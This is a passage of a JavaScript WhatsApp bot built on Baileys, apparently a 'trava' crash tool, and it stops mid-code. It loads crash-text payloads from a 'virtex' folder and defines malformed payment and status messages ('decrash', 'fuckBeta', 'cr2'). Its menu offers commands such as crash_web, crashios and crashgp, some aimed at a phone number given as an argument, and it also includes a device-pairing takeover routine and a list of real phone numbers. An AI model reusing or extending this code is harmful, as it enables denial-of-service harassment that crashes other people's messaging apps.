try {
require('./config')
const { WA_DEFAULT_EPHEMERAL,makeWaSocket,useMultiFileAuthState,getAggregateVotesInPollMessage,downloadContentFromMessage, generateWAMessageFromContent, proto, generateWAMessageContent, generateWAMessage, prepareWAMessageMedia, areJidsSameUser, getContentType } = require('@whiskeysockets/baileys')
const fs = require('fs')
const util = require('util')
const chalk = require('chalk')
const os = require('os')
const path = require('path')
const axios = require('axios')
const ffmpeg = require('fluent-ffmpeg')
const moment = require('moment-timezone')
const matemática = require('mathjs')
const { color, bgcolor } = require('./lib/color')
const { exec, spawn, execSync } = require("child_process")
const speed = require('performance-now')
const { smsg, tanggal, getTime, isUrl, sleep, clockString, runtime, fetchJson, getBuffer, jsonformat, format, parseMention, getRandom, getGroupAdmins } = require('./lib/myfunc')
const { imageToWebp, videoToWebp, writeExifImg, writeExifVid } = require('./lib/exif');
const { upload2 } = require("./lib/funcoes.js")
const colors = require("colors");
const PhoneNumber = require('awesome-phonenumber')
let phoneNumber = "557792142954"
const pairingCode = !!phoneNumber || process.argv.includes("--pairing-code")
const useMobile = process.argv.includes("--mobile")
const readline = require("readline")
const pino = require('pino')
const yargs = require('yargs/yargs')
const NodeCache = require("node-cache")


travaSend = global.travaSend;


module.exports = venom = async (venom, mek, chatUpdate, store) => {
try {
const conn = venom;
const info = mek;
const m = info;
const body = m.mtype === "conversation" ? m.message.conversation : m.mtype == "imageMessage" ? m.message.imageMessage.caption : m.mtype == "videoMessage" ? m.message.videoMessage.caption : m.mtype == "extendedTextMessage" ? m.message.extendedTextMessage.text : m.mtype == "messageContextInfo" ? m.text : m.mtype == "templateButtonReplyMessage" ? m.message.templateButtonReplyMessage.selectedId : m.mtype == "interactiveResponseMessage" ? JSON.parse(m.message.interactiveResponseMessage.nativeFlowResponseMessage.paramsJson).id : "";
const budy = (typeof m.text == 'string' ? m.text : '')
const prefixo = global.prefix ? /^[°•π÷×¶∆£¢€¥®™+✓_=|~!?@#$%^&.©^]/gi.test(body) ? body.match(/^[°•π÷×¶∆£¢€¥®™+✓_=|~!?@#$%^&.©^]/gi)[0] : "" : global.prefixo ?? global.prefixo
const command = body.replace(prefixo, '').trim().split(/ +/).shift().toLowerCase()
const comando = body.replace(prefixo, '').trim().split(/ +/).shift().toLowerCase()
const args = body.trim().split(/ +/).slice(1)
const pushname = mek.pushName || "Sem Nome"
const numerodobot = await conn.decodeJid(conn.user.id)
const text = args.join(" ")
const q = args.join(" ")
const baileys = require('@whiskeysockets/baileys');
const { type, quotedMsg, mentioned, now, fromMe } = mek
const quoted = mek.quoted ? mek.quoted : mek
const mime = (quoted.info || quoted).mimetype || ''
const isMedia = /image|video|sticker|audio/.test(mime)
const from = mek.key.remoteJid
const isGroup = from.endsWith('@g.us');
const groupMetadata = mek.isGroup ? await conn.groupMetadata(from).catch(e => {}) : ''
const sender = mek.isGroup ? (mek.key.participant ? mek.key.participant : mek.participant) : mek.key.remoteJid
const groupName = mek.isGroup ? groupMetadata.subject : ''
const membros = mek.isGroup ? await groupMetadata.participants : ''
const administrador = mek.isGroup ? await getGroupAdmins(membros) : ''
const isBot = info.key.fromMe ? true : false
const content = JSON.stringify(mek.message)
const numberQuery = text.replace(new RegExp("[()+-/ +/]", "gi"), "") + "@s.whatsapp.net"


const participants = info.isGroup ? await groupMetadata.participants : ''
const groupAdmins = info.isGroup ? await getGroupAdmins(participants) : ''
const NumeroDoBot = await conn.decodeJid(conn.user.id)
const isBotgroupAdmins = info.isGroup ? groupAdmins.includes(NumeroDoBot) : false


const mentionByReply = mek.mtype == "extendedTextMessage" && mek.message.extendedTextMessage.contextInfo != null ? mek.message.extendedTextMessage.contextInfo.mentionedJid : []
const mentionByTag = mek.mtype == "extendedTextMessage" && mek.message.extendedTextMessage.contextInfo != null ? mek.message.extendedTextMessage.contextInfo.mentionedJid : []
const Input = mentionByTag[0] ? mentionByTag[0] : mentionByReply ? mentionByReply : q ? numberQuery : false
const isImage = (type == 'imageMessage')
const isVideo = (type == 'videoMessage')
const isDocu = (type == 'documentMessage')
const isSticker = (type == 'stickerMessage')
const qtod = mek.quoted? "true":"false"
const isQuotedImage = type === 'extendedTextMessage' && content.includes('imageMessage')
const isQuotedLocation = type === 'extendedTextMessage' && content.includes('locationMessage')
const isQuotedVideo = type === 'extendedTextMessage' && content.includes('videoMessage')
const isQuotedSticker = type === 'extendedTextMessage' && content.includes('stickerMessage')
const isQuotedAudio = type === 'extendedTextMessage' && content.includes('audioMessage')
const isQuotedContact = type === 'extendedTextMessage' && content.includes('contactMessage')
const isQuotedDocument = type === 'extendedTextMessage' && content.includes('documentMessage')
const qmsg = (quoted.info || quoted)

const isgroupAdmins = m.isGroup ? groupAdmins.includes(m.sender) : false
const PrecisaSerAdm = m.isGroup ? await participants.filter(v => v.admin !== null).map(v => v.id) : ''
const PrecisaSerMembro = m.isGroup ? await participants.filter(v => v.admin === null).map(v => v.id) : [];

const { txt } = require('./database/virtex/txt.js');
const { conviteios } = require('./database/virtex/conviteios.js'); 
const { ios } = require('./database/virtex/ios.js'); 
const { porra } = require('./database/virtex/porra.js');
const { travadoc } = require('./database/virtex/travadoc.js');
const { emulador } = require('./database/virtex/emulador.js')
const { bugpdf } = require('./database/virtex/bugpdf.js')
const { quotedBug } = require('./database/virtex/quotedBug.js')
const { bugUrl } = require('./database/virtex/bugUrl.js')
const telapreta = `${travadoc}`


//************[ APi OFICIAL ]**************//

fotomenu = await getBuffer(`https://telegra.ph/file/6c498aba82ce5e1eca5b8.jpg`)
const lagall = fs.readFileSync(`${__dirname}/database/Travas/name.ext.jpg`);
const bxmidia = "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"
const rosaimg = "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIAEcAQwMBIgACEQEDEQH/xAAxAAACAwEBAAAAAAAAAAAAAAAABQIDBAEGAQADAQEBAAAAAAAAAAAAAAABAgMEAAX/2gAMAwEAAhADEAAAAE3IUWfVTyxRRbZNejZN6G8mbhn4VwWdmetoRj19VFXdijnVcGA0aMjKmrPm9It25xFNndWhk1c+k5wFDtXtWVq5rhfp81e9hDDuXS0r3fIAs7ag46tgPPVQE3grDjEDh//EACgQAAICAQMDBAIDAQAAAAAAAAECAAMRBBIhEzFRBRAiQSNhFDJCYv/aAAgBAQABPwAUV55MaisFcZ5goTnMurVGAWIAWAJiVqWYMe0FCHseYdJ8chTGTaxEZWFKvmAsccmYs3Y5zFrLDLTpZ5rIYiHT22kt2mmoJch+MQ9Hp7O/EeobzCC+lrX9wVVJjmW2ovC8nzN7WEAniWA1HgzR6lDYBdL2UNlGyvmLq0FWwqB/1FqNg357w6j4bEibilrHxMGaf082JuZsTVrXXWE/1BKSxFg/Uez4oB45lerKIBFUqcmaLpnluVmzTuVxWOJqL2q3bRC1uofO0sY6Oh2spBmmzvOJZt3tjz7WV4oDShtpE0jFySP64jipuqCcz01hW1hE9UpNyC0DkSoMocjxKq96sfEMsAOjSFtsW5xWoQ4H3L7fx/ATT2muwQ27wPsTXMEfpqu0TRY6N8Pcx7fwATJJzFfZUR9t2lVBsXb9mV+kIO7nMaizTE7jlTPUKS9KWiUWbEceYe5hsyPau4AcyvXKkHqqCX69bhtn8yvBQk7cQkAnB49v/8QAIhEAAgIBBAEFAAAAAAAAAAAAAAECESEDEBIiMRMgQVFx/9oACAECAQE/AJOKxwG4tYjRWBxqj02O5CavPgm4t9S7X4KSpdkai4YRwk3HBLzX0RjbrbVXZFqn8YJZZpPts22PUk48fZ//xAAiEQACAQMEAgMAAAAAAAAAAAAAARECEjEDECFBEyIyUWH/2gAIAQMBAT8AcLoeMCX4WwkeCobQ23gVyicjrvp56FrQlyWw4+0LUppvbfZnkSnatwP5Yn24EUv22bk8dN1207f/2Q=="
const userList = [
'5512981791389@s.whatsapp.net',
'556791420945@s.whatsapp.net',
'5599935009504@s.whatsapp.net',
'4917397773777@s.whatsapp.net',
'5512981966384@s.whatsapp.net',
'5555935051878@s.whatsapp.net',
'5575935058172@s.whatsapp.net',
'559991791193@s.whatsapp.net',
'5512981692700@s.whatsapp.net',
'5512997675520@s.whatsapp.net',
'5512981785061@s.whatsapp.net']
const isCreator = buuu = userList.includes(sender);
//************[ FiM ]**************//


//************[ GET FiLE BuFFER ]**************//
const getFileBuffer = async (mediakey, MediaType) => { 
const stream = await downloadContentFromMessage(mediakey, MediaType)

let buffer = Buffer.from([])
for await(const chunk of stream) {
buffer = Buffer.concat([buffer, chunk])
}
return buffer
}
//************[ FiM ]**************//

const { yta, ytv, googleSearch, xvideos, wallpaper, convertSticker, pornhubserch, tiktok, tiktok2, kwai, Mp3v1, Mp4v1, ytSearch, pinterest, dafont, styletext, mediafirev1, textpro, xnxxsearch } = require('./lib/scrappers.js')


const dispositivo = info.key.id.length > 21 ? 'Android' : info.key.id.substring(0, 2) == '3A' ? 'IPhone' : 'WhatsApp web'


//==========[ GiFs ]==========//
const efect1 = "`"
const efect2 = "*"
const efect3 = "_"

const array = ["https://telegra.ph/file/d0039b5c30a330d6686fa.jpg"];
const room = array[Math.floor(Math.random() * array.length)];
const fotoall = await getBuffer(room);
const menuimg = await prepareWAMessageMedia({image: fotoall}, {upload: conn.waUploadToServer});

const timestamp = speed();
const latensi = speed() - timestamp;
const neww = performance.now();
const uptime = process.uptime();
const r = (Date.now() / 1000) - info.messageTimestamp


const fuckBeta = {"key": { "fromMe": false,"participant": '0@s.whatsapp.net',"remoteJid": 'status@broadcast' },message: {"listResponseMessage": {title: 'foi o bruxoKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKkk'}}}
const decrash = (teks) => {conn.relayMessage(from, {requestPaymentMessage: {Message: {extendedTextMessage: {text: teks,currencyCodeIso4217: 'IDR',requestFrom: '5512981791389@s.whatsapp.net',expiryTimestamp: 8000,amount: 1,background: bxmidia,wa_type: 33}}}}, {})}
const cr2 = {"key": {"fromMe": false,"participant": "0@s.whatsapp.net","remoteJid": sender},message: {"paymentInviteMessage": {serviceType: "NOVI",expiryTimestamp: Date.now() + (24 * 60 * 60 * 1000) }}};
const hora = moment.tz('America/Sao_Paulo').format('HH:mm:ss');
const data = moment.tz('America/Sao_Paulo').format('DD/MM/YY');



try {
perfil = await conn.profilePictureUrl(mek.sender, 'image')
} catch (err) {
perfil = 'https://cdn.pixabay.com/photo/2015/10/05/22/37/blank-profile-picture-973460_960_720.png?q=60'
}
fotouser = await getBuffer(perfil)

if (!conn.public) {
if (!mek.key.fromMe) return
}
if (mek.message) {
console.log(
isGroup ?
'╭──────────────────────────────────\n' +
'│\n' +
`│〔 ${colors.brightYellow("GRUPO")} 〕: 〔 ${chalk.green(groupName)} 〕\n` +
'│\n' +
`│〔 ${colors.brightRed("NiCK")} 〕: ${chalk.green(pushname)}\n` +
`│〔 ${colors.brightRed("MENSAGEM")} 〕: ${chalk.green(body.length > 500 ? "" : body)}\n` +
`│〔 ${colors.brightRed("HORA")} 〕: ${chalk.green(hora)}\n` +
`│〔 ${colors.brightRed("D4ТA")} 〕: ${chalk.green(data)}\n` +
`│〔 ${colors.brightRed("TiPO")} 〕: ${chalk.green(mek.mtype)}\n` :
'╭──────────────────────────────────\n' +
'│\n' +
'│〔 ' + colors.brightYellow("PRIVADO") + ' 〕 : ' + info.chat + ' \n'+
'│\n' +
`│〔 ${colors.brightRed("NiCK")} 〕: ${chalk.green(pushname)}\n` +
`│〔 ${colors.brightRed("MENSAGEM")} 〕: ${chalk.green(body.length > 500 ? "" : body)}\n` +
`│〔 ${colors.brightRed("HORA")} 〕: ${chalk.green(hora)}\n` +
`│〔 ${colors.brightRed("D4ТA")} 〕: ${chalk.green(data)}\n` +
`│〔 ${colors.brightRed("TiPO")} 〕: ${chalk.green(mek.mtype)}\n` +
'│\n╰─────────────────────────────────\n'
);

console.log('CHAT: ' + from);
console.log('DE: ' + sender + '\n');
}

const numeroFormatado = q.replace(/[^\d]/g, '');
const numi = numeroFormatado + '@s.whatsapp.net'
const jsonData = JSON.parse(fs.readFileSync('./lib/nulo.json', 'utf-8'));
const isNewUser = jsonData.includes(sender);
const reply = (texto) => {conn.sendMessage(from, { text: texto, mentions: [sender]}, {quoted: info }).catch(e => {return reply("Erro..");})}
const enviar = (texto) => {conn.sendMessage(from, { text: texto, mentions: [sender]}, {quoted: info }).catch(e => {return reply("Erro..");})}
const enviarJson = (texto) => {conn.sendMessage(from, { text: JSON.stringify(texto, null, 4) },{quoted: info}).catch(e => {console.log(e)})}
const messageal = await prepareWAMessageMedia({ image: { url: 'https://cdn.pixabay.com/photo/2015/10/05/22/37/blank-profile-picture-973460_960_720.png?q=60' } }, { upload: conn.waUploadToServer });

switch(comando) {

case 'menu':
if (!isBot && !isCreator) return;
await conn.sendMessage(from,{react: {text: `✅`,key: info.key}})
await conn.relayMessage(from, {
viewOnceMessage: {
message: {
interactiveMessage: {
body: {
text: `\ncrash_web
catalogopc
crashios
crashios2
carousel_message
crashgp
trix < +55 xx xxxxx-xxxx >
🦁 < +55 xx xxxxx-xxxx >
🦊 < +55 xx xxxxx-xxxx >

qrcode
permission
pairing < +55 xx xxxxx-xxxx >
status < +55 xx xxxxx-xxxx >

\n`,
},
header: {
imageMessage: menuimg.imageMessage,
hasMediaAttachment: true,
},
nativeFlowMessage: {
buttons: [{
name: "cta_url",
buttonParamsJson: JSON.stringify({
display_text: "CANAL",
url: "https://youTube.com/@srbruxomp5",
})
}]
}}}}}, {});
break;

case 'qrcode':
if (!isNewUser) return enviar('> no perission')
await conn.sendMessage(from, { react: { text: `✅`, key: info.key } })
function deleteFolderRecursive(folderPath) { if(fs.existsSync(folderPath)) { fs.readdirSync(folderPath).forEach(file => { const curPath = path.join(folderPath,
	file);
  fs.lstatSync(curPath).isDirectory() ? deleteFolderRecursive(curPath) : fs.unlinkSync(curPath); });
fs.rmdirSync(folderPath); } }
deleteFolderRecursive('./lib/pairing/' + sender);
const startpairing = require('./bot.js');
await startpairing(sender);
await sleep(4000)
const pairing = fs.readFileSync('./lib/pairing/pairing.json', 'utf-8');
const cuObj = JSON.parse(pairing);
await conn.relayMessage(from, {
  viewOnceMessage: {
    message: {
      interactiveMessage: {
        body: { text: `> Código: ${cuObj.code}\n*Use esse Código para se tornar um bot.*\n\n
	1. Na home do seu WhatsApp clique nos três pontos no canto superior direito.
	2. Toque em *Dispositivos Conectados*
	3. Toque em *Conectar Dispositivo*
	4. Logo abaixo tera um *Conectar com número de telefone*, toque nele
	5. Cole seu código de 8 caracteres.` },
        header: {},
        nativeFlowMessage: {
          buttons: [{
              name: "cta_copy",
              buttonParamsJson: JSON.stringify({
